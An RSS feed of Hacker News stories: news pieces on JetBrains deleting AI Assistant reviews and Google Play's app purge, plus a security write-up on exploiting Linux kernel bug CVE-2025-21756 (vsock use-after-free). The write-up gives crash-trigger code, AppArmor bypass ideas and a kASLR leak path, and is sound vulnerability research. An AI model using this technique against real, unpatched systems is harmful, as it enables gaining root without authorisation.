<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Thu, 01 May 2025 01:30:03 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[Apple Violated Antitrust Ruling, Judge Finds (225 pts)]]></title>
            <link>https://www.wsj.com/tech/apple-violated-antitrust-ruling-federal-judge-finds-66b85957</link>
            <guid>43852145</guid>
            <pubDate>Thu, 01 May 2025 00:03:55 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.wsj.com/tech/apple-violated-antitrust-ruling-federal-judge-finds-66b85957">https://www.wsj.com/tech/apple-violated-antitrust-ruling-federal-judge-finds-66b85957</a>, See on <a href="https://news.ycombinator.com/item?id=43852145">Hacker News</a></p>
Couldn't get https://www.wsj.com/tech/apple-violated-antitrust-ruling-federal-judge-finds-66b85957: Error: Request failed with status code 401]]></description>
        </item>
        <item>
            <title><![CDATA[Mercury, the first commercial-scale diffusion language model (177 pts)]]></title>
            <link>https://www.inceptionlabs.ai/introducing-mercury</link>
            <guid>43851099</guid>
            <pubDate>Wed, 30 Apr 2025 21:51:10 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.inceptionlabs.ai/introducing-mercury">https://www.inceptionlabs.ai/introducing-mercury</a>, See on <a href="https://news.ycombinator.com/item?id=43851099">Hacker News</a></p>
Couldn't get https://www.inceptionlabs.ai/introducing-mercury: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[JetBrains defends removal of negative reviews for unpopular AI Assistant (137 pts)]]></title>
            <link>https://devclass.com/2025/04/30/jetbrains-defends-removal-of-negative-reviews-for-unpopular-ai-assistant/</link>
            <guid>43850377</guid>
            <pubDate>Wed, 30 Apr 2025 20:36:37 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://devclass.com/2025/04/30/jetbrains-defends-removal-of-negative-reviews-for-unpopular-ai-assistant/">https://devclass.com/2025/04/30/jetbrains-defends-removal-of-negative-reviews-for-unpopular-ai-assistant/</a>, See on <a href="https://news.ycombinator.com/item?id=43850377">Hacker News</a></p>
<div id="readability-page-1" class="page"><div role="main">
                            <article>
        <div>
            <ul>
                                        <li><a href="https://devclass.com/category/ai-ml/">AI/ML</a></li>
                                            <li><a href="https://devclass.com/category/development/">Development</a></li>
                                </ul>

            <header>
                <!-- title -->
                <h3>
                    <a href="https://devclass.com/2025/04/30/jetbrains-defends-removal-of-negative-reviews-for-unpopular-ai-assistant/" rel="bookmark" title="JetBrains defends removal of negative reviews for unpopular AI Assistant">
                        JetBrains defends removal of negative reviews for unpopular AI Assistant                    </a>
                </h3>

                
            </header>

            <div>
                <!-- image -->
                                        <p><img src="https://devclass.com/wp-content/uploads/2025/04/shutterstock_delete.webp" alt="JetBrains defends removal of negative reviews for unpopular AI Assistant" title="JetBrains defends removal of negative reviews for unpopular AI Assistant">
                                                    </p>
                				
                
<p>JetBrains has defended its removal of negative reviews and feedback for its AI Assistant on its plugin marketplace, stating that this was either in accordance with its policy or to remove outdated content.</p>



<p>The AI Assistant, first released in July 2023, has been downloaded over 22 million times but is rated only 2.3 out of 5. Users this week noticed that some negative reviews were being removed. “My previous comment was deleted without any specific reason. Jetbrains seems to be deleting negative reviews, which destroyed my confidence and trust in this company. They do not value their customers and their feedback anymore. I still give it 1 star, because it installed automatically and is slow and buggy,” <a href="https://plugins.jetbrains.com/plugin/22282-jetbrains-ai-assistant/reviews#116888">said one</a> today.&nbsp;</p>



<p>Reaction on social media was to see this as a desperate attempt to improve ratings; but a JetBrains employee&nbsp;<a href="https://www.reddit.com/r/Jetbrains/comments/1ka5h3g/red_flag_jetbrains_removing_bad_reviews_of_their/mpmkzoe/">said</a> that reviews were removed because they mentioned issues that had since been solved, or because they violated <a href="https://www.jetbrains.com/legal/docs/terms/marketplace-content-moderation/">policy</a> such as “swearing, etc.”</p>



<p>The spokesperson added that the company could have done better and said that “Nuking several reviews at once without a heads-up looked shady. At least, we should’ve posted a notice and provided more details to the authors.”</p>



<p>The incident has drawn attention though to the AI Assistant’s poor reputation. One developer <a href="https://plugins.jetbrains.com/plugin/22282-jetbrains-ai-assistant/reviews#116867">restated</a> their deleted post perhaps in more moderate terms, but said that issues include limited support for third-party model providers, which “is restricted to chat operations only,” noticeable latency, frequent delays, core features locked to JetBrains cloud services, inconsistent user experience across project types, and sparse documentation.</p><!-- FALCON via Article Inline Ad -->
            



<p>Another common complaint is that the AI Assistant installs itself without permission. A user on Reddit called it “the annoying self-healing/reinstalling phoenix of a plug-in.”</p>



<p>JetBrains referred us to the Reddit post linked above when we asked for comment on the deleted reviews.</p>



<p>AI services are expensive to provide, because they tend to be processor-intensive, but competition between vendors is a likely reason for JetBrains introducing a <a href="https://devclass.com/2025/04/16/jetbrains-goes-live-with-junie-ai-agent-updates-ai-assistant-adds-free-tier/">free tier</a> earlier this month, as well as a new AI agent called Junie, intended to run alongside AI Assistant. Junie has been better received that the older AI plugin, though cost is an issue. “Junie is a great tool, but it’s far too expensive. With the current AI Pro plan, my token quota was used up in just three days,” <a href="https://plugins.jetbrains.com/plugin/26104-jetbrains-junie/reviews#116783">said</a> one user.&nbsp;</p>



<p>Unlike competitors such as Microsoft, AWS or Google, JetBrains markets only developer tools and services, and does not have a separate cloud business to fall back on. Products such as the free Visual Studio Code (VS Code) have put pressure on JetBrains to be more generous with community editions of its products, but its business model depends on paying subscribers.</p>



<p>JetBrains IDEs including IntelliJ IDEA for Java and Rider for C# are well liked, though its gradual introduction of a new UI <a href="https://devclass.com/2024/08/06/jetbrains-updates-ides-with-new-ui-by-default-now-a-vs-code-lookalike-some-devs-think-so/">continues to be contentious</a>.&nbsp;&nbsp;</p>
				
							<!-- QUIZ HERE -->
							
				<!-- relpost-thumb-wrapper --><div><a href="https://devclass.com/2025/04/28/gnu-compiler-collection-15-1-released-cobol-support-improved-rust-compatibility-concerns/"><div><p><h2>GNU compiler collection 15.1 released: COBOL support, improved Rust, compatibility concerns</h2></p></div></a><a href="https://devclass.com/2025/04/23/the-hidden-cost-of-dev-stack-diversity-within-an-enterprise-engineering-chaos/"><div><p><h2>The hidden cost of dev stack diversity within an enterprise: 'Engineering chaos'</h2></p></div></a><a href="https://devclass.com/2025/04/17/next-js-15-3-released-with-near-complete-turbopack-support-but-react-server-components-are-under-fire/"><div><p><h2>Next.js 15.3 released with near-complete Turbopack support – but React Server Components are under f...</h2></p></div></a><a href="https://devclass.com/2025/04/16/jetbrains-goes-live-with-junie-ai-agent-updates-ai-assistant-adds-free-tier/"><div><p><h2>JetBrains goes live with Junie AI agent, updates AI assistant, adds free tier</h2></p></div></a><a href="https://devclass.com/2025/04/15/jruby-10-released-with-jump-to-ruby-3-4-java-21-despite-loss-of-red-hat-sponsorship/"><div><p><h2>JRuby 10 released with jump to Ruby 3.4, Java 21, despite loss of Red Hat sponsorship</h2></p></div></a><a href="https://devclass.com/2025/04/14/php-security-audit-of-critical-code-reveals-flaws-fixed-in-new-release/"><div><p><h2>PHP security audit of critical code reveals flaws, fixed in new release</h2></p></div></a><a href="https://devclass.com/2025/04/11/20-years-of-git-never-a-big-thing-for-me-says-inventor-linus-torvalds/"><div><p><h2>20 years of Git: 'Never a big thing for me,' says inventor Linus Torvalds&nbsp;</h2></p></div></a><a href="https://devclass.com/2025/04/10/qcon-london-microsofts-c-now-a-contrarian-choice/"><div><p><h2>QCon London: Microsoft’s C# now a contrarian choice?</h2></p></div></a><a href="https://devclass.com/2025/04/09/encourage-the-ai-coding-skeptics-curb-the-enthusiasts-says-software-exec-at-dev-talk/"><div><p><h2>Encourage the AI coding skeptics, curb the enthusiasts,&nbsp;says software exec at dev talk</h2></p></div></a><a href="https://devclass.com/2025/04/08/vs-code-extension-marketplace-wars-cursor-users-hit-roadblocks/"><div><p><h2>VS Code extension marketplace wars: Cursor users hit roadblocks</h2></p></div></a><a href="https://devclass.com/2025/04/04/python-now-has-a-standard-package-lock-file-format-though-winning-full-adoption-will-be-a-challenge/"><div><p><h2>Python now has a standard package lock file format – though winning full adoption will be a challeng...</h2></p></div></a><a href="https://devclass.com/2025/04/03/what-next-for-vue-js-official-report-promises-fewer-painful-upgrades-and-describes-challenges-with-forthcoming-vapor-mode/"><div><p><h2>What next for Vue.js? Official report promises fewer painful upgrades and describes challenges with ...</h2></p></div></a></div><!-- close relpost-thumb-wrapper -->
            </div>
        </div>
    </article>
                    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Google Play sees 47% decline in apps since start of last year (259 pts)]]></title>
            <link>https://techcrunch.com/2025/04/29/google-play-sees-47-decline-in-apps-since-start-of-last-year/</link>
            <guid>43849383</guid>
            <pubDate>Wed, 30 Apr 2025 19:03:49 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://techcrunch.com/2025/04/29/google-play-sees-47-decline-in-apps-since-start-of-last-year/">https://techcrunch.com/2025/04/29/google-play-sees-47-decline-in-apps-since-start-of-last-year/</a>, See on <a href="https://news.ycombinator.com/item?id=43849383">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<p id="speakable-summary">Google Play’s app marketplace is losing apps. </p>

<p>From the start of 2024 to the present, the Android app marketplace went from hosting about 3.4 million apps worldwide to just around 1.8 million, according to a new analysis by app intelligence provider <a href="http://appfigures.com/" target="_blank" rel="noreferrer noopener nofollow">Appfigures</a>. That’s a decline of about 47%, representing a significant purge of the apps that have been available to Android users globally.</p>







<p>The decline is not part of some larger global trend, the firm also notes. During the same period, Apple’s iOS App Store went from hosting 1.6 million apps to now just around 1.64 million apps, for instance — a slight increase. </p>

<p>In Google’s case, the decline in apps could be a relief for Android device owners who have had to sort through scammy, spammy, and otherwise poor-quality apps to find the best ones to install. The reduction could also help developers who have had to fight for visibility.</p>

<p>Over the years, Google Play’s less stringent requirements for app review have led to the marketplace being overrun with lower-quality apps. While Apple continues to enforce strict app review measures before publication, Google often relies on automated checks combined with malware scans to speed up the app-review process. It tends to have a shorter app-review period as a result of its lighter touch in terms of human review.</p>

<p>In July 2024, Google announced it would <a href="https://www.theverge.com/2024/7/19/24201756/google-play-store-update-purge-low-quality-android-apps" target="_blank" rel="noreferrer noopener nofollow">raise the minimum quality requirements</a> for apps, which may have impacted the number of available Play Store app listings.</p>

<p>Instead of only banning broken apps that crashed, wouldn’t install, or run properly, the company said it would begin banning apps that demonstrated “limited functionality and content.” That <a href="https://support.google.com/googleplay/android-developer/answer/9898783?visit_id=638815444407149704-1010793115&amp;rd=1#1&amp;2&amp;3&amp;4&amp;5&amp;6&amp;7&amp;87&amp;9&amp;zippy=%2Cexamples-of-common-violations" target="_blank" rel="noreferrer noopener nofollow">included static apps</a> without app-specific features, such as text-only apps or PDF-file apps. It also included apps that provided little content, like those that only offered a single wallpaper. Additionally, Google banned apps that were designed to do nothing or have no function, which may have been tests or other abandoned developer efforts.</p>
<div>
		
		<p>Techcrunch event</p>
		<div>
			
			<p><span>Berkeley, CA</span>
													<span>|</span>
													<span>June 5</span>
							</p>
							<p><a href="https://techcrunch.com/events/tc-sessions-ai/exhibit/?promo=tc_inline_exhibit&amp;utm_campaign=tcsessionsai2025&amp;utm_content=exhibit&amp;utm_medium=ad&amp;utm_source=tc">
					<span>BOOK NOW</span>
				</a>
					</p></div>
	</div>

<p>Reached for comment, Google confirmed that its new policies were factors here, which also included an expanded set of <a href="https://android-developers.googleblog.com/2023/07/boosting-trust-and-transparency-in-google-play.html" target="_blank" rel="noreferrer noopener nofollow">verification requirements</a>, <a href="https://android-developers.googleblog.com/2023/11/ensuring-high-quality-apps-on-google-play.html#:~:text=Required%20app%20testing" target="_blank" rel="noreferrer noopener nofollow">required app testing</a> for new personal developer accounts, and <a href="https://android-developers.googleblog.com/2023/11/ensuring-high-quality-apps-on-google-play.html#:~:text=Increased%20investment%20in%20app%20review" target="_blank" rel="noreferrer noopener nofollow">expanded human reviews</a> to check for apps that try to deceive or defraud users.</p>

<p>In addition, the company pointed to other 2024 investments in AI for threat detection, stronger privacy policies, improved developer tools, and more. As a result, Google <a href="https://security.googleblog.com/2025/01/how-we-kept-google-play-android-app-ecosystem-safe-2024.html" target="_blank" rel="noreferrer noopener nofollow">prevented</a> 2.36 million policy-violating apps from being published on its Play Store and banned more than 158,000 developer accounts that had attempted to publish harmful apps, it said. </p>

<p>One factor Google didn’t cite was the new trader status rule enforced by the EU as of this February, which began requiring developers to share their names and addresses in the app’s listing. Those who failed to do so would see their apps removed from EU app stores. (It’s worth pointing out that Apple <a href="https://developer.apple.com/news/?id=yfacfeal" target="_blank" rel="noreferrer noopener nofollow">also began requiring trader status</a> information in February and did not see a decline in available apps as a result.)</p>







<p>Appfigures additionally notes it began seeing a decline in the number of apps on the Google Play Store even before the official start of the purge last summer; it doesn’t yet have an explanation for this change. However, the firm says there have been 10,400 releases on Google Play so far this year, up 7.1% year-over-year as of April.</p>

<figure><img loading="lazy" decoding="async" width="788" height="786" src="https://techcrunch.com/wp-content/uploads/2025/04/appfigures-google-play-apps-removed-by-category-worldwide-19apr25.png?w=680" alt="" srcset="https://techcrunch.com/wp-content/uploads/2025/04/appfigures-google-play-apps-removed-by-category-worldwide-19apr25.png 788w, https://techcrunch.com/wp-content/uploads/2025/04/appfigures-google-play-apps-removed-by-category-worldwide-19apr25.png?resize=150,150 150w, https://techcrunch.com/wp-content/uploads/2025/04/appfigures-google-play-apps-removed-by-category-worldwide-19apr25.png?resize=300,300 300w, https://techcrunch.com/wp-content/uploads/2025/04/appfigures-google-play-apps-removed-by-category-worldwide-19apr25.png?resize=768,766 768w, https://techcrunch.com/wp-content/uploads/2025/04/appfigures-google-play-apps-removed-by-category-worldwide-19apr25.png?resize=680,678 680w, https://techcrunch.com/wp-content/uploads/2025/04/appfigures-google-play-apps-removed-by-category-worldwide-19apr25.png?resize=430,430 430w, https://techcrunch.com/wp-content/uploads/2025/04/appfigures-google-play-apps-removed-by-category-worldwide-19apr25.png?resize=720,718 720w, https://techcrunch.com/wp-content/uploads/2025/04/appfigures-google-play-apps-removed-by-category-worldwide-19apr25.png?resize=668,666 668w, https://techcrunch.com/wp-content/uploads/2025/04/appfigures-google-play-apps-removed-by-category-worldwide-19apr25.png?resize=376,375 376w, https://techcrunch.com/wp-content/uploads/2025/04/appfigures-google-play-apps-removed-by-category-worldwide-19apr25.png?resize=619,617 619w, https://techcrunch.com/wp-content/uploads/2025/04/appfigures-google-play-apps-removed-by-category-worldwide-19apr25.png?resize=532,531 532w" sizes="auto, (max-width: 788px) 100vw, 788px"></figure>


</div><div>
	
	
	
	

	
<div>
	<p>Sarah has worked as a reporter for TechCrunch since August 2011. She joined the company after having previously spent over three years at ReadWriteWeb. Prior to her work as a reporter, Sarah worked in I.T. across a number of industries, including banking, retail and software.</p>
</div>


	
	<p>
		<a data-ctatext="View Bio" data-destinationlink="https://techcrunch.com/author/sarah-perez/" data-event="button" href="https://techcrunch.com/author/sarah-perez/">View Bio <svg style="width: 1em;" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><path fill="var(--c-svg, currentColor)" d="M16.5 12 9 19.5l-1.05-1.05L14.4 12 7.95 5.55 9 4.5z"></path></svg></a>
	</p>
	
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Linux Kernel Exploitation: Attack of the Vsock (135 pts)]]></title>
            <link>https://hoefler.dev/articles/vsock.html</link>
            <guid>43849373</guid>
            <pubDate>Wed, 30 Apr 2025 19:03:04 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://hoefler.dev/articles/vsock.html">https://hoefler.dev/articles/vsock.html</a>, See on <a href="https://news.ycombinator.com/item?id=43849373">Hacker News</a></p>
<div id="readability-page-1" class="page">
       
        
       <h2>CVE-2025-21756: Attack of the Vsock</h2>
       <p><i>What started off as casual scrolling through the <a href="https://google.github.io/security-research/kernelctf/rules.html">KernelCTF</a> submissions quickly spiraled into a weeks-long deep dive into a deceptively simple patch - and my first root shell from a Linux kernel exploit!</i></p>

       <p>While browsing the <a href="https://docs.google.com/spreadsheets/d/e/2PACX-1vS1REdTA29OJftst8xN5B5x8iIUcxuK6bXdzF8G1UXCmRtoNsoQ9MbebdRdFnj6qZ0Yd7LwQfvYC2oF/pubhtml">public spreadsheet</a> of submissions, I saw an interesting entry: exp237. The bug patch seemed incredibly simple, and I was amazed that a researcher was able to leverage the issue for privilege escalation. So I set off on a journey that would lower my GPA and occasionally leave me questioning my sanity: <i>My first linux kernel exploit</i>!</p>

    <h2>Setting up the Environment</h2>
    <p>Before we can start diving into the exploit development, we need to set up a good linux kernel debugging environment. I decided to use <a href="https://www.qemu.org/">QEMU</a> with scripts from <a href="https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/">midas's</a> awesome writeup with the <a href="https://github.com/destr4ct/gef-kernel">gef-kernel</a> GDB extensions. I chose to start with linux kernel 6.6.75 since it was close to the versions being exploited by the other researchers. I actually completed this entire project within WSL so that I could write the exploit on my Windows school computer!</p> 
    <img src="https://hoefler.dev/articles/img/kern-pwn-dev.png" alt="kernel exploit development environment screenshot">

    <h2>Patch Analysis</h2>
<!-- improve this description -->
<p>As you can see from the <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=fcdd2242c0231032fc84e1404315c245ae56322a">patch</a> below, the fix only involves a few lines of code. From the code and the description, it is shown that a transport reassignment can trigger <code>vsock_remove_sock</code>, which calls <code>vsock_remove_bound</code> which decreases the reference counter on a vsock object incorrectly (if the socket was unbound to begin with). </p>

<p>When an object's reference counter reaches zero in the kernel, that object is freed to its respective memory manager. Ideally after freeing the vsock object, we will be able to trigger some sort of Use After Free (UAF) to gain a better primitive and escalate privileges.</p>
       <pre>            <code>
--- a/net/vmw_vsock/af_vsock.c
+++ b/net/vmw_vsock/af_vsock.c
@@ -337,7 +337,10 @@ EXPORT_SYMBOL_GPL(vsock_find_connected_socket);
 
 void vsock_remove_sock(struct vsock_sock *vsk)
 {
-	vsock_remove_bound(vsk);
+	/* Transport reassignment must not remove the binding. */
+	if (sock_flag(sk_vsock(vsk), SOCK_DEAD))
+		vsock_remove_bound(vsk);
+
 	vsock_remove_connected(vsk);
 }
 EXPORT_SYMBOL_GPL(vsock_remove_sock);
@@ -821,12 +824,13 @@ static void __vsock_release(struct sock *sk, int level)
 	 */
 	lock_sock_nested(sk, level);
 
+	sock_orphan(sk);
+
 	if (vsk-&gt;transport)
 		vsk-&gt;transport-&gt;release(vsk);
 	else if (sock_type_connectible(sk-&gt;sk_type))
 		vsock_remove_sock(vsk);
 
-	sock_orphan(sk);
 	sk-&gt;sk_shutdown = SHUTDOWN_MASK;
 
 	skb_queue_purge(&amp;sk-&gt;sk_receive_queue);
            </code>
       </pre>

    <p>Along with this patch, the maintainers also added a test-case for the bug, which proved useful in starting out the exploit.</p>
    <pre>        <code>
#define MAX_PORT_RETRIES	24	/* net/vmw_vsock/af_vsock.c */
#define VMADDR_CID_NONEXISTING	42

/* Test attempts to trigger a transport release for an unbound socket. This can
 * lead to a reference count mishandling.
 */
static void test_seqpacket_transport_uaf_client(const struct test_opts *opts)
{
	int sockets[MAX_PORT_RETRIES];
	struct sockaddr_vm addr;
	int s, i, alen;

	s = vsock_bind(VMADDR_CID_LOCAL, VMADDR_PORT_ANY, SOCK_SEQPACKET);

	alen = sizeof(addr);
	if (getsockname(s, (struct sockaddr *)&amp;addr, &amp;alen)) {
		perror("getsockname");
		exit(EXIT_FAILURE);
	}

	for (i = 0; i &lt; MAX_PORT_RETRIES; ++i)
		sockets[i] = vsock_bind(VMADDR_CID_ANY, ++addr.svm_port,
					SOCK_SEQPACKET);

	close(s);
	s = socket(AF_VSOCK, SOCK_SEQPACKET, 0);
	if (s &lt; 0) {
		perror("socket");
		exit(EXIT_FAILURE);
	}

	if (!connect(s, (struct sockaddr *)&amp;addr, alen)) {
		fprintf(stderr, "Unexpected connect() #1 success\n");
		exit(EXIT_FAILURE);
	}
	/* connect() #1 failed: transport set, sk in unbound list. */

	addr.svm_cid = VMADDR_CID_NONEXISTING;
	if (!connect(s, (struct sockaddr *)&amp;addr, alen)) {
		fprintf(stderr, "Unexpected connect() #2 success\n");
		exit(EXIT_FAILURE);
	}
	/* connect() #2 failed: transport unset, sk ref dropped? */

	addr.svm_cid = VMADDR_CID_LOCAL;
	addr.svm_port = VMADDR_PORT_ANY;

	/* Vulnerable system may crash now. */
	bind(s, (struct sockaddr *)&amp;addr, alen);

	close(s);
	while (i--)
		close(sockets[i]);

	control_writeln("DONE");
}
        </code>
    </pre>

    <h2>Initial Ideas</h2>

    <p>With this being a UAF bug, I initially had the idea of attempting a <a href="https://i.blackhat.com/Asia-24/Presentations/Asia-24-Wu-Game-of-Cross-Cache.pdf">cross-cache attack</a>. My broad plan was as follows...</p>
    <ol>
        <li>Trigger the arbitrary free of a vsock object</li>
        <li>Reclaim the page with some user controlled object like <code>msg_msg</code></li>
        <li>Corrupt some function pointer in the vsock object to gain code execution</li>
    </ol>

<!--     <p>With these ideas in mind, I was able to spray <code>msg_msg</code> objects to reclaim the freed vsock object.</p> -->

    <h2>We’ve Got a Panic!</h2>

    <p>Slightly modifying and running the test code on my VM (see <a href="https://hoefler.dev/articles/attachments/crash.c">crash.c</a>) actually leads to the kernel panic seen below! Through some debugging, we find that the vsock object is actually still linked into the <code>vsock_bind_table</code> despite being freed. Great!</p>

    <!-- <pre><code>
[    6.510796] BUG: kernel NULL pointer dereference, address: 0000000000000000
[    6.511577] #PF: supervisor read access in kernel mode
[    6.512468] #PF: error_code(0x0000) - not-present page
[    6.513228] PGD 80000000068f3067 P4D 80000000068f3067 PUD 68f2067 PMD 0
[    6.514703] Oops: 0000 [#1] PREEMPT SMP PTI
[    6.515144] CPU: 0 PID: 111 Comm: x Tainted: G        W          6.6.75 #2
[    6.515461] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    6.516113] RIP: 0010:aa_sk_perm+0x6b/0x220
[    6.516466] Code: f6 43 41 08 0f 85 97 00 00 00 49 8b 95 80 02 00 00 48 8b 35 67 1c 29 03 65 48 8b 0c 25 00 24 03 00 48 85 db 41 0f 95 c6 31 c0 <48> 39 32 74 1e f6 434
[    6.518694] RSP: 0018:ffffc9000062fd38 EFLAGS: 00000246
[    6.519368] RAX: 0000000000000000 RBX: ffff88800528c1a8 RCX: ffff8880064bbf00
[    6.519683] RDX: 0000000000000000 RSI: ffff88800528d5a8 RDI: ffffffff832d94eb
[    6.520118] RBP: ffffffff832d94eb R08: ffffc9000062fda8 R09: 0000000000000000
[    6.520458] R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000200000
[    6.521168] R13: ffff8880068fc500 R14: 0000000000000001 R15: 0000000000000000
[    6.522032] FS:  000000003eb18380(0000) GS:ffff888007a00000(0000) knlGS:0000000000000000
[    6.522565] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    6.523028] CR2: 0000000000000000 CR3: 00000000068f0000 CR4: 00000000000006f0
[    6.523366] Call Trace:
[    6.523691]  <TASK>
[    6.523875]  ? __die+0x1f/0x70
[    6.524088]  ? page_fault_oops+0x17d/0x4c0
[    6.524377]  ? search_module_extables+0x4a/0x80
[    6.524794]  ? aa_sk_perm+0x6b/0x220
[    6.525005]  ? search_bpf_extables+0x5b/0x80
[    6.525357]  ? exc_page_fault+0x7d/0x170
[    6.525596]  ? asm_exc_page_fault+0x22/0x30
[    6.525866]  ? aa_sk_perm+0x6b/0x220
[    6.526099]  security_socket_bind+0x3a/0x60
[    6.526532]  __sys_bind+0xca/0xf0
[    6.526696]  ? __rseq_handle_notify_resume+0x34a/0x510
[    6.527071]  __x64_sys_bind+0x14/0x20
[    6.527262]  do_syscall_64+0x5d/0x90
[    6.527569]  ? syscall_exit_to_user_mode+0x27/0x40
[    6.528178]  ? __x64_sys_connect+0x14/0x20
[    6.528436]  ? do_syscall_64+0x69/0x90
[    6.528779]  ? __rseq_handle_notify_resume+0x34a/0x510
[    6.529442]  ? __pfx_read_tsc+0x10/0x10
[    6.529741]  ? task_mm_cid_work+0x18d/0x1f0
[    6.530005]  ? switch_fpu_return+0x17/0xe0
[    6.530265]  ? exit_to_user_mode_prepare+0x137/0x150
[    6.530892]  entry_SYSCALL_64_after_hwframe+0x78/0xe2
[    6.531221] RIP: 0033:0x433737
[    6.531610] Code: 49 0f bc c4 c1 e0 1a 0d 00 00 04 00 89 01 e9 e0 fe ff ff e8 4b 01 00 00 66 2e 0f 1f 84 00 00 00 00 00 90 b8 31 00 00 00 0f 05 <48> 3d 01 f0 ff ff 738
[    6.532627] RSP: 002b:00007fff7fb8c9c8 EFLAGS: 00000206 ORIG_RAX: 0000000000000031
[    6.533179] RAX: ffffffffffffffda RBX: 00007fff7fb8cc38 RCX: 0000000000433737
[    6.533610] RDX: 0000000000000010 RSI: 00007fff7fb8c9e0 RDI: 0000000000000003
[    6.534433] RBP: 00007fff7fb8ca60 R08: 0000000000000000 R09: 000000003eb196a0
[    6.535428] R10: 0000000000001000 R11: 0000000000000206 R12: 0000000000000001
[    6.536232] R13: 00007fff7fb8cc28 R14: 0000000000000001 R15: 0000000000000001
[    6.536633]  </TASK>
    </code></pre> -->

    <img src="https://hoefler.dev/articles/img/panic.png">

    <p>The panic occurs when AppArmor dereferences a NULL sk_security pointer during a bind() call on the recycled socket. This confirms the UAF and highlights the obstacle posed by LSM hooks (see below).</p>

    <h2>Roadblock #1: AppArmor + LSM</h2>
    <img src="https://hoefler.dev/articles/img/lotsofarmor.jpg" alt="AppArmor">
    <p>The first major roadblock we hit is apparmor. This is the seen in the above callstack where the kernel invokes <code>security_socket_bind</code> and <code>aa_sk_perm</code>. The <code>security_socket_*</code> functions are Linux Security Module (LSM) hooks which call into AppArmor. So how is our socket failing for AppArmor security check?</p>
    <p>Investigating the problem, it is apparent that <code>__sk_destruct</code> calls <code>sk_prot_free</code> which calls <code>security_sk_free</code>. So when we trigger our bug to decrement the refcnt and the vsock is freed, the <code>sk-&gt;sk_security</code> pointer will be zeroed out.</p>
    <pre><code>

/**
 * security_sk_free() - Free the sock's LSM blob
 * @sk: sock
 *
 * Deallocate security structure.
 */
void security_sk_free(struct sock *sk)
{
	call_void_hook(sk_free_security, sk);
	kfree(sk-&gt;sk_security);
	sk-&gt;sk_security = NULL;
}
    </code></pre>
    <p>But when we call <code>security_socket_bind</code>, the AppArmor function dereferences this <code>sk-&gt;sk_security</code> struct. Worse yet, it seems like almost every socket function has an LSM counterpart. In short: the kernel grants us a dangling pointer to the socket — but AppArmor ensures we crash before we can do anything useful with it. So how can we UAF if we can't even call any useful functions with our recycled socket?</p>
    <!-- <img src="img/lotsofarmor.jpg" style="width: 20pc"> -->
    <pre><code>
gef&gt; p security_socket_*
security_socket_accept             security_socket_getpeername        
security_socket_bind               security_socket_getpeersec_dgram   
security_socket_connect            security_socket_getpeersec_stream  
security_socket_create             security_socket_getsockname        
security_socket_getsockopt         security_socket_sendmsg
security_socket_listen             security_socket_setsockopt
security_socket_post_create        security_socket_shutdown
security_socket_recvmsg            security_socket_socketpair
</code></pre>

<p>We have two main options.</p>
<ol>
<li>Forge an sk_security pointer to a fake object</li>
<li>Find some functions which aren't protected by apparmor</li>
</ol>
<p>I decided to explore option #2 first.</p>

<!-- <pre><code>
static inline struct aa_sk_ctx *aa_sock(const struct sock *sk)
{
	return sk->sk_security + apparmor_blob_sizes.lbs_sock;
}

static int aa_label_sk_perm(const struct cred *subj_cred,
			    struct aa_label *label,
			    const char *op, u32 request,
			    struct sock *sk)
{
	struct aa_sk_ctx *ctx = aa_sock(sk);
	int error = 0;

	AA_BUG(!label);
	AA_BUG(!sk);

	if (ctx->label != kernel_t && !unconfined(label)) {
		struct aa_profile *profile;
		DEFINE_AUDIT_SK(ad, op, sk);

		ad.subj_cred = subj_cred;
		error = fn_for_each_confined(label, profile,
			    aa_profile_af_sk_perm(profile, &ad, request, sk));
	}

	return error;
}
</code></pre> -->

    <h2>Chinks in the (App)Armor &amp; Defeating kASLR</h2>
    <img src="https://hoefler.dev/articles/img/broken.jpg" alt="">
    <p>My first focus was to find a way to leak some addresses. Some "obvious" choices would be functions like <code>getsockopt</code> or <code>getsockname</code> but these functions are all protected by apparmor. Browsing through source code, I stumbled upon the <code>vsock_diag_dump</code> feature. This was a super interesting function, as it isn't protected by apparmor. The code is listed below.</p>
    <pre><code>
static int vsock_diag_dump(struct sk_buff *skb, struct netlink_callback *cb)
{
	
	// ... snip ...

	/* Bind table (locally created sockets) */
	if (table == 0) {
		while (bucket &lt; ARRAY_SIZE(vsock_bind_table)) {
			struct list_head *head = &amp;vsock_bind_table[bucket];

			i = 0;
			list_for_each_entry(vsk, head, bound_table) {
				struct sock *sk = sk_vsock(vsk);

				if (!net_eq(sock_net(sk), net))
					continue;
				if (i &lt; last_i)
					goto next_bind;
				if (!(req-&gt;vdiag_states &amp; (1 &lt;&lt; sk-&gt;sk_state)))
					goto next_bind;
				if (sk_diag_fill(sk, skb,
						 NETLINK_CB(cb-&gt;skb).portid,
						 cb-&gt;nlh-&gt;nlmsg_seq,
						 NLM_F_MULTI) &lt; 0)
					goto done;
next_bind:
				i++;
			}
			last_i = 0;
			bucket++;
		}

		table++;
		bucket = 0;
	}

	// ... snip ...

}
    </code></pre>
